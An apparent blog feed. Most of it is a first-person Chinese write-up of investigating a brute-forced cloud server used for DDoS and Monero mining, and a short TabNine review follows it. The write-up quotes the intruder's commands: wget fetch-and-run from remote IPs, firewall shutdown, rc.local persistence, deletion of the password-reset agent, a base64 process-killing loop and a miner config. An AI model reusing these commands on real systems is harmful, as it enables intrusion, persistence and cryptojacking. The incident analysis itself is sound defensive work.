<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Zhengyu Zhang]]></title>
  <subtitle><![CDATA[This world is a playground.]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="https://freemandealer.github.io/gallery/"/>
  <updated>2020-01-10T05:21:38.535Z</updated>
  <id>https://freemandealer.github.io/gallery/</id>
  
  <author>
    <name><![CDATA[Zhengyu Zhang]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[记录人生中第一次发现电脑被入侵]]></title>
    <link href="https://freemandealer.github.io/gallery/2020/01/06/dont-hack-me/"/>
    <id>https://freemandealer.github.io/gallery/2020/01/06/dont-hack-me/</id>
    <published>2020-01-06T13:52:03.000Z</published>
    <updated>2020-01-10T05:21:38.535Z</updated>
    <content type="html"><![CDATA[<p>2019年的最后一天下午，突然收到了百度云发来的短信，说我的服务器正在恶意攻击别人：</p>
<a id="more"></a>
<p><img src="/img/2D1352707033F95409E6E9833.jpg?30" alt=""></p>
<p>登陆百度云后，收到了站内信：</p>
<p><img src="/img/adasd.png?80" alt=""></p>
<p>作为一个良民，我从来不琢磨攻击别人这件事。无辜又疑惑的我提工单寻求帮助，技术支持提供了具体的攻击手段SYNC_FLOOD（查了一下属于DDoS的一种）和攻击时间（12-30 的 12:05 至 18:41）。</p>
<p><img src="/img/E86A7D8EC6E9D9F5CF515AB0AC8862E8.png?40" alt=""></p>
<p>对着时间，往上查了一下系统日志，马上就精神了。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># &#36825;&#37324;&#26159;&#33021;&#30475;&#21040;&#30340;&#26368;&#26089;&#30340;&#26085;&#24535;&#10;Dec 30 03:42:01 instance-3eq6v61r cron[1064]: (*system*) RELOAD (/etc/crontab)&#10;Dec 30 04:17:01 instance-3eq6v61r CRON[15653]: (root) CMD (   cd / &#38;&#38; run-parts --report /etc/cron.hourly)&#10;Dec 30 05:17:01 instance-3eq6v61r CRON[23129]: (root) CMD (   cd / &#38;&#38; run-parts --report /etc/cron.hourly)&#10;Dec 30 06:17:01 instance-3eq6v61r CRON[30198]: (root) CMD (   cd / &#38;&#38; run-parts --report /etc/cron.hourly)&#10;Dec 30 06:25:01 instance-3eq6v61r CRON[31138]: (root) CMD (test -x /usr/sbin/anacron || ( cd / &#38;&#38; run-parts --report /etc/cron.daily ))&#10;Dec 30 06:25:01 instance-3eq6v61r rsyslogd: [origin software=&#34;rsyslogd&#34; swVersion=&#34;8.16.0&#34; x-pid=&#34;1009&#34; x-info=&#34;http://www.rsyslog.com&#34;] rsyslogd was HUPed&#10;Dec 30 06:25:01 instance-3eq6v61r kernel: [151273.108068] EXT4-fs warning (device sda): htree_dirblock_to_tree:959: inode #2: lblock 0: comm updatedb.mlocat: error -5 reading directory block&#10;Dec 30 07:17:01 instance-3eq6v61r CRON[5112]: (root) CMD (   cd / &#38;&#38; run-parts --report /etc/cron.hourly)&#10;Dec 30 08:17:01 instance-3eq6v61r CRON[12087]: (root) CMD (   cd / &#38;&#38; run-parts --report /etc/cron.hourly)&#10;#&#36825;&#37324;&#34987;&#25104;&#21151;&#30331;&#20837;&#20102;&#65292;&#30475;&#26102;&#38388;&#19981;&#26159;&#26412;&#20154;&#10;Dec 30 08:44:54 instance-3eq6v61r systemd[1]: Started Session 225 of user root.</span><br></pre></td></tr></table></figure>
<p>syslog日志显示，在 Dec 30 08:44:54 有其他人登陆过我的系统。并且有一个奇怪的定时任务 ( cron.hourly ) 每小时都会执行一遍。接着我有看了一下 auth 日志，它会记录各种登陆时的验证信息，包括失败的验证和成功的验证。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#10;Dec 30 08:40:33 instance-3eq6v61r sshd[14727]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=51.91.136.174  user=root&#10;Dec 30 08:40:35 instance-3eq6v61r sshd[14727]: Failed password for root from 51.91.136.174 port 49568 ssh2&#10;Dec 30 08:40:36 instance-3eq6v61r sshd[14727]: Received disconnect from 51.91.136.174 port 49568:11: Normal Shutdown, Thank you for playing [preauth]&#10;Dec 30 08:40:36 instance-3eq6v61r sshd[14727]: Disconnected from 51.91.136.174 port 49568 [preauth]&#10;Dec 30 08:44:54 instance-3eq6v61r sshd[15221]: Accepted password for root from 51.91.136.174 port 47114 ssh2  # &#25214;&#21040;&#20102;&#23545;&#24212;&#30340;&#34987;&#20182;&#20154;&#25104;&#21151;&#30331;&#20837;&#30340;&#28857;&#65292;&#26102;&#38388;&#23545;&#30340;&#19978;&#12290;&#22855;&#24618;&#30340;&#26159;&#21518;&#38754;&#20182;&#36824;&#22312;&#19981;&#20572;&#35797;&#23494;&#30721;&#65292;&#26159;&#20195;&#30721;&#27809;&#20889;&#22909;&#65292;&#36824;&#26159;&#40657;&#23458;&#19981;&#21482;&#19968;&#20010;&#65311;&#10;Dec 30 08:44:54 instance-3eq6v61r sshd[15221]: pam_unix(sshd:session): session opened for user root by (uid=0)&#10;Dec 30 08:44:54 instance-3eq6v61r systemd-logind[1027]: New session 225 of user root.&#10;Dec 30 08:44:55 instance-3eq6v61r sshd[15221]: Received disconnect from 51.91.136.174 port 47114:11: Normal Shutdown, Thank you for playing&#10;Dec 30 08:44:55 instance-3eq6v61r sshd[15221]: Disconnected from 51.91.136.174 port 47114&#10;Dec 30 08:44:55 instance-3eq6v61r sshd[15221]: pam_unix(sshd:session): session closed for user root&#10;Dec 30 08:44:55 instance-3eq6v61r systemd-logind[1027]: Removed session 225.&#10;Dec 30 08:49:22 instance-3eq6v61r sshd[15784]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=51.91.136.174  user=root&#10;Dec 30 08:49:25 instance-3eq6v61r sshd[15784]: Failed password for root from 51.91.136.174 port 44660 ssh2&#10;Dec 30 08:49:25 instance-3eq6v61r sshd[15784]: Received disconnect from 51.91.136.174 port 44660:11: Normal Shutdown, Thank you for playing [preauth]&#10;Dec 30 08:49:25 instance-3eq6v61r sshd[15784]: Disconnected from 51.91.136.174 port 44660 [preauth]&#10;Dec 30 08:54:01 instance-3eq6v61r sshd[16302]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=51.91.136.174  user=root&#10;Dec 30 08:54:03 instance-3eq6v61r sshd[16302]: Failed password for root from 51.91.136.174 port 42206 ssh2&#10;...</span><br></pre></td></tr></table></figure>
<p>日志显示 Dec 30 08:44:54 确实有人成功登陆了我的机器，登陆者的 ip 为 51.91.136.174。这个 ip 在成功登陆之前做了很多很多错误的尝试。看来是通过暴力破解进入的。这里说明一下，我这台机器是为了测试一个小东西临时创建的云虚机，所以使用了一个不严肃的密码: test@123。在配置密码时百度云其实已经提示我弱口令警告了，但我为了图方便没有管警告。</p>
<p>日志中比较有意思的还有亮点，这个 ip 成功登陆后还在不停尝试其它密码，估计是暴力破解的代码没写好，进程/线程没有同步导致的。另外除了这个 ip 以外，还有很多 ip 在尝试登陆。这说明入侵者有很多肉机，也有可能尝试的入侵者不止一波人。这些来自很多国家和地区，随便查了其中两个ip的归属地，分别来自法国和荷兰。</p>
<p>接下来，我又查看了一下命令历史记录，没想到真的有记录。在我印象中，入侵最后一步不是要清除痕迹的吗？难道是新手？还是说他觉得这台机器的主人不会查记录？说实话，如果不是百度云风控报警，我也不会注意我的机器被入侵。先来看一下他的操作记录：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">629  root 2019/12/29 19:20:47 service iptables stop&#10;630  root 2019/12/29 19:20:50 wget http://111.38.249.179:45889/java-id&#10;631  root 2019/12/29 19:22:02 chmod 777 java-id&#10;632  root 2019/12/29 19:22:02 ./java-id&#10;633  root 2019/12/29 19:22:02 cd /tmp&#10;634  root 2019/12/29 19:22:02 service iptables stop&#10;635  root 2019/12/29 19:22:03 wget http://111.38.249.179:45889/java-mm&#10;636  root 2019/12/29 19:22:25 chmod 777 java-mm&#10;637  root 2019/12/29 19:22:25 ./java-mm&#10;638  root 2019/12/29 19:22:25 echo &#34;cd  /root/&#34;&#62;&#62;/etc/rc.local&#10;639  root 2019/12/29 19:22:25 echo &#34;./java-id&#38;&#34;&#62;&#62;/etc/rc.local&#10;640  root 2019/12/29 19:22:25 echo &#34;./java-mm&#38;&#34;&#62;&#62;/etc/rc.local&#10;641  root 2019/12/29 19:22:25 echo &#34;/etc/init.d/iptables stop&#34;&#62;&#62;/etc/rc.local&#10; &#10;827  root 2019/12/30 03:40:39 service iptables stop&#10;828  root 2019/12/30 03:40:43 wget http://111.39.153.250:27788/jdk-8k&#10;829  root 2019/12/30 03:40:47 chmod 777 jdk-8k&#10;830  root 2019/12/30 03:40:51 ./jdk-8k&#10;831  root 2019/12/30 03:40:55 cd /usr/sbin/&#10;832  root 2019/12/30 03:40:59 service iptables stop&#10;833  root 2019/12/30 03:41:03 wget http://111.39.153.250:27788/jdk-9k&#10;834  root 2019/12/30 03:41:07 chmod 777 jdk-9k&#10;835  root 2019/12/30 03:41:11 ./jdk-9k&#10;836  root 2019/12/30 03:41:15 echo &#34;cd  /root/&#34;&#62;&#62;/etc/rc.local&#10;837  root 2019/12/30 03:41:19 echo &#34;./jdk-8k&#38;&#34;&#62;&#62;/etc/rc.local&#10;838  root 2019/12/30 03:41:23 echo &#34;./jdk-9k&#38;&#34;&#62;&#62;/etc/rc.local&#10;839  root 2019/12/30 03:41:27 echo &#34;/etc/init.d/iptables stop&#34;&#62;&#62;/etc/rc.local</span><br></pre></td></tr></table></figure>
<p>历史记录显示这家伙关了我的防火墙，然后从 111.38.249.179:45889 下载了两个可执行文件，名字分别叫做 jdk-8k 和 jdk-9k，并且运行了它们。对于这个 ip 查看到它来自国内安徽六安。</p>
<p>随后我去目录里寻找 jdk-8k、jdk-9k 这两个可疑文件，然而什么都没找到。另外我探测了 111.38.249.179 这台主机，显示主机活着，但45889和27788两个端口拒绝了我的连接。这意味着有如下几种可能：</p>
<ul>
<li>入侵者删除了文件，并隐藏了删除操作的历史 （基本没可能，他要会隐藏历史就不会让我看到上面这些）</li>
<li>这几个文件运行时自销毁（高级！）</li>
<li>这些命令是脚本敲入或是批量复制粘贴的，其实根本没有成功（这意味DDoS攻击的发起另有他人）</li>
</ul>
<p>如果说另有其人的话，会是上面那个每小时跑一遍的定时任务吗？我找到了 conb.hourly 所执行的二进制文件 /lib/udev/udev，用 gdb 反汇编：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="keyword">for</span> function main:</span><br><span class="line">	<span class="number">0x0804b759</span> &lt;+<span class="number">897</span>&gt;:	call   <span class="number">0x8049360</span> &lt;encrypt_code&gt;</span><br><span class="line">	...</span><br><span class="line">	<span class="number">0x0804b889</span> &lt;+<span class="number">1201</span>&gt;:	call   <span class="number">0x8048555</span> &lt;readfile&gt;</span><br><span class="line">	...</span><br><span class="line">	<span class="number">0x0804ba5d</span> &lt;+<span class="number">1669</span>&gt;:	call   <span class="number">0x8048cdc</span> &lt;DelService&gt;</span><br><span class="line">	...</span><br><span class="line">	<span class="number">0x0804bb1a</span> &lt;+<span class="number">1858</span>&gt;:	call   <span class="number">0x8048796</span> &lt;writefile&gt;</span><br><span class="line">	...</span><br><span class="line">	<span class="number">0x0804bdba</span> &lt;+<span class="number">2530</span>&gt;:	call   <span class="number">0x8048b8c</span> &lt;InstallSYS&gt;</span><br><span class="line">	...</span><br><span class="line">	<span class="number">0x0804bdcd</span> &lt;+<span class="number">2549</span>&gt;:	call   <span class="number">0x804a289</span> &lt;CheckLKM&gt;</span><br><span class="line">	...</span><br><span class="line">	<span class="number">0x0804be80</span> &lt;+<span class="number">2728</span>&gt;:	call   <span class="number">0x804d0ac</span> &lt;decrypt_remotestr&gt;</span><br><span class="line">	...</span><br><span class="line">	<span class="number">0x0804bea7</span> &lt;+<span class="number">2767</span>&gt;:	call   <span class="number">0x804a365</span> &lt;HidePidPort&gt;</span><br><span class="line">	...s s</span><br></pre></td></tr></table></figure>
<p>不用仔细看，光读函数名就不自然。首先是这个刺眼驼峰拼写法，显然不像 udev 的作风。接着我们知道udev是linux管理设备和驱动的一个模块（具体可以看我之前的文章 <a href="http://freemandealer.github.io/2016/09/01/device-driver-linux-device-driver/">设备驱动 - Linux Device Driver Model</a>），它从不与 “remote” 进行交互。不管它是不是ddos攻击的发起程序，它一定不是真正的 udev。最后看那些 “encrypt” “decrypt” “Hide” 的字眼，偷偷摸摸一看就不正经。 </p>
<p>到此，对于我被 DDoS 已经有了一些头绪：我的服务器被人入侵了，在里面跑了一些乱七八糟的程序。但是还有很多问题没搞清楚：</p>
<ul>
<li>入侵者有几个？jdk小子 和 udev小子 是同一人还是两波人吗？还会有第三个人、第四个人、第五个人吗？</li>
<li>DDoS 到底是那个程序发起的，神秘消失的 jdk 还是鬼鬼祟祟的 udev? 抑或是其它我未曾探知的程序？</li>
</ul>
<p>收集到的信息不多，我决定在系统上运行 script 并隐藏起来，等入侵者下次光临时录下他的一举一动，看看他们到底在干什么、怎么干的。</p>
<p>过了一天后，在2020年的第一天，我发现入侵者果然再次光临了我的服务器。1月1号夜里23点24分，他潜入后进行了一波操作。不像上次留了很多历史记录给我追查，这次他谨慎地对入侵痕迹进行了清理：删掉了登陆记录和命令执行历史。不过由于之前开起了 script 对所有登陆者的操作进行录屏，所以还是捕捉到了他的一举一动。通过回放操作我发现，入侵者的操作基本上是复制粘贴现成脚本结合手动异常处理，并非是完全自动化脚本。这次进来，他同样熟练地关防火墙，然后开始下载运行他的 jdk 们，最后清理操作痕迹。通过记录可以看到，jdk 下载是成功的，同时也没有手动删除的操作，说明它们确实是运行中自销毁的程序。</p>
<p><img src="/img/hackme_sadfdsfa.png?40" alt=""></p>
<p>另外这次他的操作明显与上次操作风格不一样，变得非常谨慎。他可能注意到我可能注意到他的入侵了。为了避免他发现我发现了他，我也尽量减少自己的足迹。之前我通过命令前加空格来避免自己排查黑客行为的命令被记录在历史中，但有时候命令敲快了就忘了，而且因为不能复用历史命令，这也降低了我的排查效率。考虑到linux会把当前会话的历史记录在内存中，只有回话退出时才写入文件，所以我只要不退出会话。这次我通过百度云提供的网页vnc来保持我的会话。这样做的一个额外好处是，我避免了 script 录制到我自己的操作。</p>
<p>后来证明，我用 vnc 保持会话的决策是正确的。2020年1月2号凌晨1点18分，又有人登陆了会话。但是这次，我无法通过自己的密码登陆我的服务器了。入侵者竟然给我改了密码！虽然通过百度云提供的改密服务可以强行把密码设置回来，但这样一来他就会发现我发现了他的入侵，会比较尬。还好 vnc 保持的会话还在，登上去回放一下他的操作记录，原来是把我的密码改成了 BrrrrrBBBxgdQr37。再看紧接着后面的命令，背后后一阵冰凉：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="constant">@instance</span>-<span class="number">3</span>eq6v61r:~<span class="preprocessor"># rm -rf /CloudResetPwdUpdateAgent</span></span><br></pre></td></tr></table></figure>
<p>这是想把云服务提供的重设密码功能也给我停掉吗？太阴险了这个人，奔着霸占我的服务器来并且下了死手！再次感谢我的 vnc 的会话。另外被这两句命令戳中笑点：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="constant">@instance</span>-<span class="number">3</span>eq6v61r:/<span class="built_in">opt</span>/nu<span class="preprocessor"># pkill -9 Trump<span class="comment">;</span></span></span><br><span class="line">root<span class="constant">@instance</span>-<span class="number">3</span>eq6v61r:/<span class="built_in">opt</span>/nu<span class="preprocessor"># pkill -9 Donald<span class="comment">;</span></span></span><br></pre></td></tr></table></figure>
<p>接着继续观赏他的其它操作，他的工具是从up2www这个网站下载的，我也进入这个网站看看：</p>
<p><img src="/img/hackme_uploader.png?25" alt=""></p>
<p>。。。不认识这个文字。Google翻译一下，在规则页面中发现原来是伊斯兰共和国的网站。</p>
<p><img src="/img/image-20200102120937588.png?30" alt=""></p>
<p>据此判断是个外国入侵者的可能性挺大。顺手给这个网站举报一下工具上传者。</p>
<p>另外判断是外国入侵者的依据是我观察到的一个现象：他总是用 bing.com 来判断网络联通性而不是 ping baidu.com 更不是 ping google.com。因此真相只有一个：他很有可能是知道我国国情的外国黑客。</p>
<p>凌晨1点的这次登陆，除了改密码独占我的服务器，主要还是关闭系统防御，做入侵者的事，清楚记录这三步。当然受限于中国的绿色网络长城，他的很多操作都没能一下成功，也是折腾了不轻。GFW 干得漂亮！</p>
<p>跟着入侵者的操作，找到了他部署在我服务器上的文件：</p>
<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="collection">[<span class="collection">&#123;<span class="string">"url"</span>:<span class="string">"pool.supportxmr.com:3000"</span>,<span class="string">"user"</span>:<span class="string">"8721pHzrmSB2xPpmRxvU9CXU9cXhom87fEgBkXRjVp4nBvJnyvC6ke2ZUrs6MjPD6 ^M6RW1paxQScKCgXwwiYaUPEVFNB468G"</span>,<span class="string">"pass"</span>:<span class="string">"xx"</span>,<span class="string">"coin"</span>:<span class="string">"monero"</span>,<span class="string">"algo"</span>:<span class="string">"rx/0"</span>,<span class="string">"tls"</span><span class="attribute">:false</span>,<span class="string">"tls-fingerprint"</span><span class="attribute">:null</span>&#125;</span>,<span class="collection">&#123;<span class="string">"url"</span>:<span class="string">"de03.supportxmr.com:3000"</span>,<span class="string">"u ^Mser"</span>:<span class="string">"8721pHzrmSB2xPpmRxvU9CXU9cXhom87fEgBkXRjVp4nBvJnyvC6ke2ZUrs6MjPD66RW1paxQScKCgXwwiYaUPEVFNB468G"</span>,<span class="string">"pass"</span>:<span class="string">"xx"</span>,<span class="string">"coin"</span>:<span class="string">"monero"</span>,<span class="string">"algo"</span>:<span class="string">"rx/0"</span>,<span class="string">" ^Mtls"</span><span class="attribute">:false</span>,<span class="string">"tls-fingerprint"</span><span class="attribute">:null</span>&#125;</span>,<span class="collection">&#123;<span class="string">"url"</span>:<span class="string">"pool.supportxmr.com:443"</span>,<span class="string">"user"</span>:<span class="string">"8721pHzrmSB2xPpmRxvU9CXU9cXhom87fEgBkXRjVp4nBvJnyvC6ke2ZUrs6MjPD66RW1p ^MaxQScKCgXwwiYaUPEVFNB468G"</span>,<span class="string">"pass"</span>:<span class="string">"xx"</span>,<span class="string">"coin"</span>:<span class="string">"monero"</span>,<span class="string">"algo"</span>:<span class="string">"rx/0"</span>,<span class="string">"tls"</span><span class="attribute">:true</span>,<span class="string">"tls-fingerprint"</span><span class="attribute">:null</span>&#125;</span>,<span class="collection">&#123;<span class="string">"url"</span>:<span class="string">"de03.supportxmr.com:9000"</span>,<span class="string">"user"</span>:<span class="string">" ^M8AriWF4frRPjgpJfgUYjLR5SML2Dz3eTc9iEMRbvt41SF6vzeJq1sJsRrc8iWYerVNZfs8rctwhvRFXgd2Cc64F3UmYvQNS"</span>,<span class="string">"pass"</span>:<span class="string">"x"</span>,<span class="string">"coin"</span>:<span class="string">"monero"</span>,<span class="string">"algo"</span>:<span class="string">"rx/0"</span>,<span class="string">"tls"</span><span class="attribute">:tr</span> <span class="comment">^Mue</span>,<span class="string">"tls-fingerprint"</span><span class="attribute">:null</span>&#125;</span>,<span class="collection">&#123;<span class="string">"url"</span>:<span class="string">"hk02.supportxmr.com:443"</span>,<span class="string">"user"</span>:<span class="string">"8AriWF4frRPjgpJfgUYjLR5SML2Dz3eTc9iEMRbvt41SF6vzeJq1sJsRrc8iWYerVNZfs8rctwhvRF ^MXgd2Cc64F3UmYvQNS"</span>,<span class="string">"pass"</span>:<span class="string">"x"</span>,<span class="string">"coin"</span>:<span class="string">"monero"</span>,<span class="string">"algo"</span>:<span class="string">"rx/0"</span>,<span class="string">"tls"</span><span class="attribute">:true</span>,<span class="string">"</span><br><span class="line">...</span></span></span></span><br></pre></td></tr></table></figure>
<p>历史记录中的神秘代码，base64编码：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch -n <span class="number">5</span> `<span class="regexp">/bin/</span>bash -c <span class="string">"base64 -d &lt;&lt;&lt; "</span>YT1gcHMgYWh1eCAtLXNvcnQ9LWMgfCBhd2sgJ3tpZigkMz4xMC4wICYmICQxMSE9Ii9vcHQvbnUvc3NoLWRhZW1vbiIgJiYgJDExIT0iL3Vzci9iaW4vc3VkbyIgJiYgJDExIT0iL2Jpbi9iYXNoIilwcmludGYiJTZkXG4iLCQyLCQxMX0nYDtmb3IgaSBpbiAkYTsgZG8gYT1gcmVhZGxpbmsgL3Byb2MvJGkvZXhlYDtraWxsIC05ICRpOyBjcCAkYSAkYS5vbGQ7Y2hhdHRyIC1pYSAkYTsgY2htb2QgLXggJGE7cm0gLXJmICRhO3RvdWNoICRhOyBjaGF0dHIgK2lhICRhOyAgZG9uZTs<span class="string">""</span>` &amp;&gt; <span class="regexp">/dev/</span><span class="keyword">null</span> &amp;^M</span><br></pre></td></tr></table></figure>
<p>解码后得到：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=`ps ahux --<span class="keyword">sort</span>=-c | awk '&#123;<span class="keyword">if</span>(<span class="label">$3</span>&gt;10.0 &amp;&amp; <span class="label">$11</span>!=<span class="string">"/opt/nu/ssh-daemon"</span> &amp;&amp; <span class="label">$11</span>!=<span class="string">"/usr/bin/sudo"</span> &amp;&amp; <span class="label">$11</span>!=<span class="string">"/bin/bash"</span>)printf<span class="string">"%6d\n"</span>,<span class="label">$2</span>,<span class="label">$11&#125;</span>'`;<span class="keyword">for</span> i <span class="keyword">in</span> <span class="label">$a</span>; <span class="keyword">do</span> a=`readlink /proc/<span class="label">$i</span>/exe`;kill -9 <span class="label">$i</span>; cp <span class="label">$a</span> <span class="label">$a</span>.old;chattr -ia <span class="label">$a</span>; chmod -x <span class="label">$a</span>;<span class="keyword">rm</span> -rf <span class="label">$a</span>;touch <span class="label">$a</span>; chattr +ia <span class="label">$a</span>;  don</span><br></pre></td></tr></table></figure>
<p>加上这段：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./ssh-daemon -o pool<span class="class">.supportxmr</span><span class="class">.com</span>:<span class="number">3333</span> -u <span class="number">8721</span>pHzrmSB2xPpmRxvU9CXU9cXhom87fEgBkXRjVp4nBvJnyvC6ke2ZUrs6Mj ^MPD66RW1paxQScKCgXwwiYaUPEVFNB468G -coin monero -<span class="tag">a</span> rx/<span class="number">0</span> &amp;&gt; log<span class="class">.txt</span> &amp;</span><br></pre></td></tr></table></figure>
<p>并且通过 user id 搜到一个类似的攻击记录  <a href="http://uglyduck.vajn.icu/honeypot/" target="_blank" rel="external">http://uglyduck.vajn.icu/honeypot/</a></p>
<p>基本上可以推断，他只是进来想用我的服务器为他免费挖矿。基本上现在可以确定，入侵者应该不止一波了，而是很多人怀揣着自己的梦想向我的服务器走来。有意思的是他们清除历史痕迹的风格迥异：有的非常耐心细致地帮我一个文件一个文件地清除操作历史，有的则是脾气很不好地直接把系统存放日志的目录一锅全删了。联想到成功登陆后试密码的动作却依然在进行，基本可以确定有多伙人在搞我。把最近登陆进来的人分为几批：</p>
<ul>
<li><p>jdk党，一心一意试图在我电脑上下载自己java-sdk。运行后自销毁。很神秘。天天来。</p>
</li>
<li><p>udev党，每小时执行定时任务，运行的二进制 udev 有待进一步分析。来过一次。</p>
</li>
<li><p>矿工党，试图拿我的机器挖矿，并暴力修改密码和删除改密机制来独占我的机器。今天刚来。</p>
</li>
<li><p>DDos党，可能是上面出现过的人，也可能是另一伙我没抓到的神秘人。</p>
</li>
</ul>
<p>了解这个状况后，我陷入了深深的担忧：矿工党修改密码后岂不是其它黑客进不来了？由于矿工党单纯的意图我已经摸清了，我对他兴趣不大，所以决定撕破脸皮，直接把密码又改了回去，向其他入侵者重新开放怀抱。今天差不多这样，先抹掉自己的痕迹静观其变。</p>
<p>为了了解 udev 党的意图，我把可疑的 udev 文件交给了真正的黑客、0 day 漏洞挖掘机周宇做逆向分析（本来寻求他帮助是想让他帮我反击打击黑产的，结果他现在专心挖洞不搞渗透了。大神风范！）宇神告诉我 udev 就是我一直在找的 DDoS 发起者。同时他授人以渔地推荐给了我很多好用的逆向工具，让我直接从用 gdb 一点点 disassemble 一路升天到一键 decompile。然后自己顺利的地分析了 jdk 小子的两个可疑文件：</p>
<p><img src="/img/image-20200102191830507.png" alt="image-20200102191830507" style="zoom:150%;"></p>
<p>jdk8 和 9 应该是同样的目的，猜测入侵者是为了同时兼容 SystemV 和 linux 而做了两个版本。因为 jdk8带有符号信息，尝试反编译，最终找到核心攻击代码：</p>
<p><img src="/img/image-20200102191424119.png?60" alt=""></p>
<p>竟然也是在 DDoS!</p>
<p>完结撒花！</p>
<p>通过这件事，我学到一个朴素的知识：弱口令是真的危险。入侵者有时候目的还是很邪恶的，不只是强行跟你共享服务器，可能会企图完全霸占。不能抱着“应该没有人会盯上我这台小破机器吧”的侥幸态度，一定要认真设置密码，哪怕只是试验机。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>2019年的最后一天下午，突然收到了百度云发来的短信，说我的服务器正在恶意攻击别人：</p>]]>
    
    </summary>
    
      <category term="Meta" scheme="https://freemandealer.github.io/gallery/tags/Meta/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[tabnine试用体验]]></title>
    <link href="https://freemandealer.github.io/gallery/2019/07/23/tabnine-experience/"/>
    <id>https://freemandealer.github.io/gallery/2019/07/23/tabnine-experience/</id>
    <published>2019-07-23T05:42:43.000Z</published>
    <updated>2020-01-09T05:44:49.197Z</updated>
    <content type="html"><![CDATA[<p>tabnine 已经推出大半年了，网上资料很少，中文网站更是只限于翻译其广告大吹“AI辅助写代码神器”，也没有个正经使用报告。于是我写这篇文章分享一下实际使用的体验。</p>
<a id="more"></a>
<h2 id="安装体验">安装体验</h2><p>从官网上的指南来看，tabnine 安装非常容易。我试了sublime和vim的配置，基本按照说明无痛安装，装好也不用配置，做到了开箱即用。只是vim的安装指南有些坑：tabnine的vim插件实际上是通过YCM改的，官方指南漏掉了需要运行YCM install.py 编译core的过程。</p>
<p>开箱即用的tabnine只有基于AI的补全功能，如果需要基于语义的补全功能，还需要安装第三方 language server。不同语言有不同的 language server，c++默认使用的是 cquery。在OS X下可以用homebrew一键安装。但到了一台老版本的cent os下就比较麻烦了，包管理器没有相关资源。</p>
<p>值得一提的是，在这台老版本的centos 上，tabnine 无法被执行。这是因为 tabnine 是闭源软件，软件包中提供的是二进制文件，兼容性比较差。好消息是这个问题只存在部分linux系统上，Windows/OS X 这类标准的系统没有问题。</p>
<h2 id="使用体验">使用体验</h2><p>第一感觉：没广告中那么智能。广告 gif 中可以看到，tabnine可以识别if-else语义自动针对if中的yes不缺else中的no。甚至还可以识别函数头注释中的自然语言，为函数头定义代码给出建议。实际体验中，并没有感受到这种智能，可能这些功能是付费内容，也可能只针对特定语言。不过对比同样是开箱即用状态下的YCM，确实补全建议要有意义一些。我的YCM开启了基于语义的自动补全，在开箱即用的状态下，补全建议很多但相关性很差，摸不清它补全的逻辑。而同样开箱状态下的额tabnine，建议就精简但是有意义很多。当然这里的“有意义”不等于有用，只是能够感觉到tabnine是能感知到上下文的。总体来说，我的测试中，tabnine提供的建议相对更有帮助一些，但仅限于矮子里面拔将军，对于实际工程效率的提升可以说还是比较有限的，没有广告gif中用的飞起的感觉。注意，本测试是开箱即用的情况下，对c/c++所做的测试。</p>
<p>半年后更新体验：经过一段时间，发现tabnine确实如广告那样智能，它真的知道你在做什么！比如你在一个分支 print success 并 return true，然后写完 else 这个词后它真的会提示你 print failed 及 return false。另外它不仅学习你的代码，还有强大的 github 库作为支撑。有时候忘记 c++ 模板库的用法，大概写一个开头 tabnine 就会替你补完——不仅省了打字时间，还省了查小本本的时间。</p>
<h2 id="云服务和隐私保护">云服务和隐私保护</h2><p>reddit上对tabnine的隐私保护问题质疑比较多。tabnine 提供了云服务（截止本文写作时间，tabnine cloud 还处于公测版），需要把用户代码上传到它的云上进行加速解析。尽管作者把自己的云说的很值得信任（用了SSL啦、处理完就删除信息啦），但大家还是担心自己的代码会在过程中泄漏。实际上使用 tabnine 时完全可以不使用它的云服务。它的云主要是为了加速，提供更好的延迟体验。如果不使用云，这些处理将会在本地完成，比较消耗本地资源，但这个过程不需要联网（除了liscence 验证需要网络）。</p>
<h2 id="价格">价格</h2><p>tabnine可以无限期免费体验，但索引的工程大小不能超过400K。同时作为一个商业软件，tabnine提供了49\$个人版、企业版99\$ 。收费版同样有工程大小的限制，目前是 100MB。收费版这个限制主要是因为索引超过100MB 的内容对内存的消耗非常大，延迟也会很高。纵观tabnine的历史，通过作者不断改进技术，相信收费版的这个限制会慢慢改善。</p>
